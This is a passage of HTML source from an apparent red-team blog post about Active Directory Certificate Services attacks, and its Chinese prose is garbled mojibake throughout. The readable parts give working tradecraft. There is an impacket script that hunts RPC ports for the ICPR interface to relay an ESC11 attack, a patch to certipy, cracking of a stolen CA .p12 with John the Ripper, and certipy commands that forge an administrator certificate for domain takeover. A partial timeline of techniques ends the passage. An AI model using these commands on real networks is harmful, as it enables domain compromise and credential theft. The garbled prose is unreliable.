&lt;p&gt;ESC3 ç¬¬äºŒå¼µæ†‘è­‰ç¯„æœ¬çš„æ¢ä»¶å‰‡å¯ç”¨å¦ä¸€å€‹ç¶²åŸŸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;child2.corp.local&lt;/code&gt; çš„ä¸»æ©Ÿå‘ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;corp-CA02-CA&lt;/code&gt; ç”³è«‹å–å¾—ã€‚å› æ­¤åœ¨æˆåŠŸç²å¾— &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Template1&lt;/code&gt; æ†‘è­‰å¾Œï¼Œè—‰ç”±å·²æ§åˆ¶çš„ä¸»æ©Ÿ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ws02.child2.corp.local&lt;/code&gt; ä»¥ Enterprise Admins çš„èº«åˆ†ç”³è«‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Template2&lt;/code&gt; æ†‘è­‰ç¯„æœ¬ï¼ŒåŠ ä¸Šè©²æ†‘è­‰å…è¨±ç¶²åŸŸèªè­‰ï¼Œç¢ºèªç²å¾—æœ€é«˜æ§åˆ¶æ¬Šã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½ å¯èƒ½æœƒæƒ³å•ç‚ºä»€éº¼ä¸èƒ½ç›´æ¥ç”³è«‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Template2&lt;/code&gt; æ†‘è­‰ï¼Œé€™æ˜¯å› ç‚ºè©²æ†‘è­‰éœ€è¦ç°½ç« ï¼Œå¿…é ˆä»¥å¸¶æœ‰ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Certificate Request Agent&lt;/code&gt; EKU çš„æ†‘è­‰ç”³è«‹ï¼Œä¹Ÿå°±æ˜¯é€é ESC8 ç”³è«‹çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Template1&lt;/code&gt; æ†‘è­‰ã€‚&lt;/p&gt;

&lt;p&gt;å¾é€™å€‹æ¡ˆä¾‹ä¸­ï¼Œé›–ç„¶å¼±é»åœ¨æ–¼ ESC8ï¼Œä¸”å–®ç¨çš„å¼±é»ç„¡æ³•é€ æˆå¤ªå¤§å½±éŸ¿ï¼Œä½†æˆ‘å€‘ä»å¯æ­é…å…¶ä»–æ†‘è­‰åŠ ä¸Šå…§ç¶²æ©«å‘ç§»å‹•ç²å¾—çš„æˆæœï¼Œä¸€æ­¥æ­¥åœ°æ»¿è¶³æ¢ä»¶ï¼Œæœ€çµ‚å–å¾—ç›®æ¨™æ¬Šé™ã€‚&lt;/p&gt;

&lt;h3 id=&quot;æ¡ˆä¾‹äºŒæ²’æœ‰-135-port-çš„-esc11&quot;&gt;æ¡ˆä¾‹äºŒï¼šæ²’æœ‰ 135 port çš„ ESC11&lt;/h3&gt;

&lt;p&gt;ESC11 èˆ‡ ESC8 é¡ä¼¼ï¼Œçš†ç‚º relay æ”»æ“Šã€‚å·®åˆ¥åœ¨æ–¼ ESC8 relay çš„ç›®æ¨™æ˜¯ CA çš„ HTTP æœå‹™ï¼Œè€Œ ESC11 å‰‡æ˜¯å› ç‚ºç”¨æ–¼æ†‘è­‰ç›¸é—œæ“ä½œçš„ ICPR å”å®šæ²’æœ‰å¼·åˆ¶åŠ å¯†çš„è¨­å®šé€ æˆï¼Œæ”»æ“Šæœ¬èº«æ˜¯ relay åˆ° RPC çš„ä»‹é¢ (TCP 135 port åŠç›¸é—œçš„é«˜ port ç­‰)ã€‚&lt;/p&gt;

&lt;p&gt;åŸ·è¡Œæ»²é€éç¨‹æ™‚ï¼Œæˆ‘å€‘é‡åˆ° CA çš„ 135 port ç„¡æ³•é€£ç·šï¼Œä½† certipy é€é 445 port å­˜å– remote registry å¯ä»¥ç¢ºèªå­˜åœ¨ ESC11 å¼±é»ã€‚ç„¶è€Œæ­£å¸¸ RPC æµç¨‹æœƒé€é 135 port çš„ Endpoint Mapper ä¾†ç¢ºèª ICPR æ‰€ä½¿ç”¨çš„å‹•æ…‹ port ä¾†é€²è¡Œæºé€šï¼Œä¸‹åœ–ä»¥ 49783 port ç‚ºä¾‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;å•é¡Œï¼šèƒ½ä¸èƒ½åœ¨ä¸å° 135 port é€£ç·šçš„ç‹€æ³ä¸‹ï¼Œå­˜å– ICPR ä¾†æˆåŠŸ relay è«‹æ±‚é€²è€Œå–å¾—æ†‘è­‰ï¼Ÿ&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;å›é ­æª¢è¦– RPC æ©Ÿåˆ¶ï¼Œåœ¨é€²è¡Œ ICPR æºé€šæ™‚ï¼Œæœƒéœ€è¦å…ˆå°é€™å€‹ä»‹é¢åš binding ä¸¦å¸¶ä¸Š ICPR ä»‹é¢çš„ UUIDã€‚è‹¥è©²ä»‹é¢ä¸æ˜¯ ICPR å‰‡ binding æœƒå¤±æ•—ã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å¯ä»¥ç›´æ¥å°æ‰€æœ‰å¯èƒ½ä¸”é–‹å•Ÿçš„ RPC port é€²è¡Œ ICPR bindingï¼Œé è¨­ç‚ºç¯„åœæ˜¯ 49152 ~ 65535ï¼ŒæˆåŠŸ binding çš„è©±å³ç‚º ICPR ä»‹é¢ï¼š&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;impacket.dcerpc.v5&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;transport&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;impacket.uuid&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uuidtup_to_bin&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;impacket.dcerpc.v5&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rpcrt&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;icpr_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MSRPC_UUID_ICPR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uuidtup_to_bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;91ae6020-9e3c-11cf-8d7c-00aa00c091be&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;rpctransport&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;transport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DCERPCTransportFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ncacn_ip_tcp:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target_ip&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rpctransport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setRemoteHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rpctransport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_connect_timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dce&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rpctransport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_dce_rpc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_auth_level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rpcrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RPC_C_AUTHN_LEVEL_PKT_PRIVACY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;dce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;dce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MSRPC_UUID_ICPR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# TODO: modify these variables
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ca_ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;10.1.1.101&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;open_ports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;49664&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;49669&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;49670&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;49783&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;53661&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;icpr_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ca_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æœ€å¾Œé€éä¿®æ”¹ &lt;a href=&quot;https://github.com/ly4k/Certipy/blob/4.8.2/certipy/commands/relay.py#L137&quot;&gt;certipy ç¨‹å¼ç¢¼&lt;/a&gt;åˆ°å°æ‡‰çš„ port åŠ CA çš„ IP å¦‚ä¸‹å³å¯æˆåŠŸ relay ä¸¦å–å¾—æ†‘è­‰é”æˆç¶²åŸŸææ¬Šï¼š&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stringbinding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ncacn_ip_tcp:&amp;lt;CA_IP&amp;gt;[&amp;lt;ICPR_PORT&amp;gt;]&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¿®æ”¹å‹•æ…‹å–å¾—å°æ‡‰ port çš„ç¨‹å¼é‚è¼¯å¦‚é™„åœ–ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;æ¡ˆä¾‹ä¸‰æ’¿åˆ°ç§é‘°&quot;&gt;æ¡ˆä¾‹ä¸‰ï¼šæ’¿åˆ°ç§é‘°&lt;/h3&gt;

&lt;p&gt;æˆ‘å€‘ä¹Ÿæ›¾é‡éå¹¾æ¬¡åœ¨æ©«å‘ç§»å‹•çš„éç¨‹æ’¿åˆ° PFX æˆ– P12 æ†‘è­‰æª”æ¡ˆï¼Œå®ƒå‡ºç¾åœ¨å…¬é–‹çš„ SMB share æˆ–ç‰¹å®šæˆ‘å€‘æœ‰å–å¾—æ¬Šé™çš„ä¸»æ©Ÿæª”æ¡ˆç³»çµ±ä¸­ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨ä¸€æ¬¡ç´…éšŠæ¼”ç·´å–å¾—å¤–ç¶²é€²å…¥é»ä¸¦å»ºç«‹ Tunnel å¾Œï¼Œç™¼ç¾ Domain Controller æœ‰å¤šå€‹é¡å¤–çš„ SMB åˆ†äº«è³‡æ–™å¤¾ä¸”å…è¨±ç¶²åŸŸä½¿ç”¨è€…å­˜å–ã€‚æˆ‘å€‘é€éå–å¾—çš„å¸³è™Ÿé–‹å§‹ç¿»æ‰¾å„ç¨®å¯èƒ½çš„é«˜åƒ¹å€¼æª”æ¡ˆã€‚åœ¨é€™ä¹‹ä¸­ï¼Œçœ‹åˆ°å¹¾å€‹èˆ‡ CA åç¨±ç›¸é—œçš„ P12 æª”æ¡ˆã€‚ç›´è¦ºå’Œç¶“é©—å‘Šè¨´æˆ‘å€‘ï¼Œé€™å¯èƒ½æ˜¯éå¸¸é—œéµçš„æª”æ¡ˆï¼Œä¾¿åœ¨å–å¾—æª”æ¡ˆå¾Œä»¥ John the Ripper ç ´è§£æ†‘è­‰æª”æ¡ˆçš„å¯†ç¢¼ï¼š&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pfx2john corp-CA01-CA.p12 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash
&lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;WORDLIST &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç”±æ–¼å¯†ç¢¼å¼·åº¦ä¸è¶³ï¼Œåœ¨æˆåŠŸç ´è§£å¾Œä¾¿èƒ½æª¢è¦–å…¶ä¸­çš„æ†‘è­‰è³‡è¨Šï¼š&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl pkcs12 &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; corp-CA01-CA.p12 &lt;span class=&quot;nt&quot;&gt;-nokeys&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; corp-CA01-CA.crt
openssl x509 &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; corp-CA01-CA.crt &lt;span class=&quot;nt&quot;&gt;-text&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-noout&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å…§å®¹å¤§è‡´å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            23:23:8f:98:da:e5:21:95:4d:59:49:af:23:b4:47:34
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: DC=local, DC=corp, CN=corp-CA01-CA
        Validity
            Not Before: Dec  3 09:34:02 2024 GMT
            Not After : Dec  3 09:44:02 2029 GMT
        Subject: DC=local, DC=corp, CN=corp-CA01-CA
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:ba:1e:cb:84:ff:5c:9d:91:09:75:38:40:ee:7f:
                    f7:1c:0b:bb:fd:91:81:f3:eb:07:3d:c9:93:39:a8:
...SNIP...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¾ç™¼è¡Œè€… (Issuer) åŠ Subject å¯çœ‹å‡ºè©²æ†‘è­‰æª”æ¡ˆå°æ‡‰åˆ° AD CS çš„ CAï¼Œä¾¿å¯å˜—è©¦ä»¥è©²ç§é‘°å½é€ æ†‘è­‰ä¸¦é©—è­‰èº«åˆ†ï¼š&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;certipy cert &lt;span class=&quot;nt&quot;&gt;-pfx&lt;/span&gt; corp-CA01-CA.p12 &lt;span class=&quot;nt&quot;&gt;-password&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;1qaz@WSX&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-export&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; corp-CA01-CA-nopass.p12
certipy forge &lt;span class=&quot;nt&quot;&gt;-ca-pfx&lt;/span&gt; corp-CA01-CA-nopass.p12 &lt;span class=&quot;nt&quot;&gt;-upn&lt;/span&gt; administrator@corp.local &lt;span class=&quot;nt&quot;&gt;-subject&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;CN=Administrator,CN=Users,DC=corp,DC=local&apos;&lt;/span&gt;

certipy auth &lt;span class=&quot;nt&quot;&gt;-pfx&lt;/span&gt; administrator_forged.pfx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æœ€å¾Œç¶“é PKINIT å–å¾—ç¶²åŸŸç®¡ç†å“¡çš„ NTHash é€²è¡Œ Pass the Hashï¼ŒæˆåŠŸå½é€ èº«åˆ†æˆçˆ² DAï¼&lt;/p&gt;

&lt;p&gt;é€™äº›æƒ…å¢ƒå¸¸ç™¼ç”Ÿåœ¨å‚™ä»½æ™‚ï¼ŒåŒ¯å‡ºäº†æ†‘è­‰åŠç§é‘°ï¼Œä½†å»æ²’æœ‰ä½¿ç”¨è¶³å¤ è¤‡é›œçš„å¯†ç¢¼é€²è¡ŒåŠ å¯†ä¾†ä¿è­·ï¼Œå°è‡´æˆ‘å€‘å–å¾— root CA åŠ Domain Controller çš„ç§é‘°ç­‰é«˜æ¬Šé™çš„èº«åˆ†ï¼Œå› æ­¤å¯ä»¥ä»»æ„å½é€ æ†‘è­‰æˆ–é€²è¡Œ DCSync ç­‰æ“ä½œé€²è€Œå–å¾—æ•´å€‹ç¶²åŸŸçš„æ§åˆ¶æ¬Šã€‚&lt;/p&gt;

&lt;h2 id=&quot;æ™‚é–“è»¸&quot;&gt;æ™‚é–“è»¸&lt;/h2&gt;

&lt;p&gt;ä»¥ä¸‹æ•´ç†å¾ 2021 å¹´ Certified Pre-Owned ç™½çš®æ›¸ç™¼ä½ˆæˆªè‡³ 2025 å¹´ 1 æœˆçš„ AD CS æ”»æ“Šæ‰‹æ³•çš„æ¼”é€²ï¼š&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;æ™‚é–“&lt;/th&gt;
      &lt;th&gt;æ”»æ“Šæ‰‹æ³•&lt;/th&gt;
      &lt;th&gt;å‚™è¨»&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/06&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf&quot;&gt;Certified Pre-Owned&lt;/a&gt; ESC1 ~ ESC8&lt;/td&gt;
      &lt;td&gt;æ­¸ç´äº† AD CS çš„å„ç¨®æ‰‹æ³•ï¼ŒåŒ…å«ææ¬Šã€Persistenceï¼Œé‚„æœ‰é˜²ç¦¦åŠåµæ¸¬çš„å»ºè­°&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/06&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab&quot;&gt;Shadow Credential&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;é€éå¯«å…¥å¸³è™Ÿçš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msDS-KeyCredentialLink&lt;/code&gt; å±¬æ€§ä¾†æ¥ç®¡å¸³è™Ÿçš„æ‰‹æ³•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2022/02&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6&quot;&gt;Certipy 2.0&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;æåˆ° certipy æ–°å¢çš„åŠŸèƒ½ï¼Œä»¥åŠä¸€å€‹ç°¡æ½”çš„ ESC7 åˆ©ç”¨æ–¹å¼&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2022/05&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4&quot;&gt;Certifried: CVE-2022â€“26923&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;åˆ©ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dNSHostName&lt;/code&gt; åŠæ†‘è­‰ mapping çš„æ©Ÿåˆ¶é”æˆç¶²åŸŸææ¬Šæ¼æ´&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2022/05&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16&quot;&gt;KB5014754&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;è©² patch ä¿®å¾© Certifried æ¼æ´ï¼Œä½†ä¹Ÿè®“ ESC6 å¤±æ•ˆ&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2022/08&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7&quot;&gt;ESC9 &amp;amp; ESC10&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;ESC6 å¤±æ•ˆå¾Œçš„å»¶ä¼¸åˆ©ç”¨&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2022/11&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d&quot;&gt;Certificates and Pwnage and Patches, Oh My!&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;æåˆ°å‰è¿°æ‰‹æ³•çš„æ¼”é€²é‚„æœ‰ patch å°è‡´çš„ä¸€äº›åˆ©ç”¨æŠ€å·§è®ŠåŒ–&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2022/11&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/?ref=heartburn.dev&quot;&gt;ESC11&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;ICPR æœªå¼·åˆ¶åŠ å¯†çš„è¨­å®šå°è‡´å¯èƒ½çš„ relay æ”»æ“Š&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2023/05&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c&quot;&gt;From DA to EA with ESC5&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;å¾ Domain Admins ææ¬Šåˆ° Enterprise Admins çš„æ–¹å¼&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2023/10&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm&quot;&gt;ESC12&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;CA è‹¥ä½¿ç”¨ YubiHSM2 ï¼Œå¯ç™»å…¥ CA çš„ä½¿ç”¨è€…æœ‰æ©Ÿæœƒå–å¾—è§£å¯†çš„é‡‘é‘°é€²è€Œæå‡æ¬Šé™&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/02&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53&quot;&gt;ESC13&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;æ†‘è­‰ç¯„æœ¬è‹¥å­˜åœ¨ issuance policy ä¸”æœ‰ç›¸æ‡‰çš„ OID group link æ™‚çš„åˆ©ç”¨æ‰‹æ³•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/02&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9&quot;&gt;ESC14&lt;/a&gt;&lt;/td&gt;
